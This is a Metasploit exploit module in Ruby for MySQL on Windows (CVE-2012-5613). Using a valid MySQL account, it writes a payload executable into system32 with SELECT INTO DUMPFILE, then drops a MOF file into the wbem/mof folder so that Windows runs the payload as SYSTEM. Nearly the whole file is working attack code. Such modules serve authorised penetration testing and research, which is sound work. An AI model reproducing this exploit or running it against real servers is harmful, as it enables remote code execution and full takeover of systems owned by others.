# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::MYSQL
    include Msf::Exploit::WbemExec
    include Msf::Exploit::EXE
    include Msf::Exploit::FileDropper
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Oracle MySQL for Microsoft Windows MOF Execution&#039;,
            &#039;Description&#039;    => %q{
                    This modules takes advantage of a file privilege misconfiguration problem
                specifically against Windows MySQL servers (due to the use of a .mof file).
                This may result in arbitrary code execution under the context of SYSTEM. However,
                please note in order to use this module, you must have a valid MySQL account on
                the target machine.
            },
            &#039;Author&#039;         =>
                [
                    &#039;kingcope&#039;,
                    &#039;sinn3r&#039;
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2012-5613&#039;], #DISPUTED
                    [&#039;EDB&#039;, &#039;23083&#039;],
                    [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2012/Dec/13&#039;]
                ],
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;MySQL on Windows&#039;, { } ]
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Dec 01 2012&#039;
        ))
 
        register_options(
            [
                OptString.new(&#039;USERNAME&#039;, [ true, &#039;The username to authenticate as&#039;]),
                OptString.new(&#039;PASSWORD&#039;, [ true, &#039;The password to authenticate with&#039;])
            ])
    end
 
    def check
        begin
            m = mysql_login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
        rescue RbMysql::AccessDeniedError
            print_error("#{peer} - Access denied.")
            return Exploit::CheckCode::Safe
        end
 
        return Exploit::CheckCode::Appears if is_windows?
        return Exploit::CheckCode::Safe
    end
 
    def peer
        "#{rhost}:#{rport}"
    end
 
    def query(q)
        rows = []
 
        begin
            res = mysql_query(q)
            return rows if not res
            res.each_hash do |row|
                rows << row
            end
        rescue RbMysql::ParseError
            return rows
        end
 
        return rows
    end
 
    def is_windows?
        r = query("SELECT @@version_compile_os;")
        return (r[0][&#039;@@version_compile_os&#039;] =~ /^Win/) ? true : false
    end
 
    def get_drive_letter
        r = query("SELECT @@tmpdir;")
        drive = r[0][&#039;@@tmpdir&#039;].scan(/^(\w):/).flatten[0] || &#039;&#039;
        return drive
    end
 
    def upload_file(bin, dest)
        p = bin.unpack("H*")[0]
        query("SELECT 0x#{p} into DUMPFILE &#039;#{dest}&#039;")
    end
 
    def exploit
        print_status("#{peer} - Attempting to login as &#039;#{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}&#039;")
        begin
            m = mysql_login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
            return if not m
        rescue RbMysql::AccessDeniedError
            print_error("#{peer} - Access denied.")
            return
        end
 
        if not is_windows?
            print_error("#{peer} - Remote host isn&#039;t Windows.")
            return
        end
 
        drive    = get_drive_letter
        exe_name = Rex::Text::rand_text_alpha(5) + ".exe"
        dest     = "#{drive}:/windows/system32/#{exe_name}"
        exe      = generate_payload_exe
        print_status("#{peer} - Uploading to &#039;#{dest}&#039;")
        begin
            upload_file(exe, dest)
            register_file_for_cleanup("#{exe_name}")
        rescue RbMysql::AccessDeniedError
            print_error("#{peer} - No permission to write. I blame kc :-)")
            return
        end
 
        mof_name = Rex::Text::rand_text_alpha(5) + ".mof"
        dest     = "#{drive}:/windows/system32/wbem/mof/#{mof_name}"
        mof      = generate_mof(mof_name, exe_name)
        print_status("#{peer} - Uploading to &#039;#{dest}&#039;")
        begin
            upload_file(mof, dest)
            register_file_for_cleanup("wbem\\mof\\good\\#{mof_name}")
        rescue RbMysql::AccessDeniedError
            print_error("#{peer} - No permission to write. Bail!")
            return
        end
    end
 
end

